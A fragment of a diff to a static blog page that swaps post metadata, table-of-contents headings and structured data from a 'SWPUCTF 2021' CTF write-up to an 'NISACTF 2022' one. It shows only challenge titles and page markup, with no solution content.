-      <meta itemprop="discussionUrl" content="/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/11/17/NISACTF-2022/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2640,7 +2643,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-F12"><span class="toc-text">gift_F12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jicao"><span class="toc-text">jicao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-md5"><span class="toc-text">easy_md5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#caidao"><span class="toc-text">caidao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyrce"><span class="toc-text">easyrce</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyssrf"><span class="toc-text">easyssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a></li></ol>
     </div>
   </section>
 
@@ -3214,7 +3217,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/14/SWPUCTF-2021-新生赛/","name":"SWPUCTF 2021 新生赛"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SWPUCTF 2021 新生赛","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","wordCount":0,"datePublished":"2022-11-14T03:12:53.000Z","dateModified":"2022-11-16T10:14:31.910Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/17/NISACTF-2022/","name":"NISACTF 2022"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"NISACTF 2022","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/17/NISACTF-2022/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/17/NISACTF-2022/","wordCount":0,"datePublished":"2022-11-17T03:14:57.000Z","dateModified":"2022-11-17T05:13:23.230Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
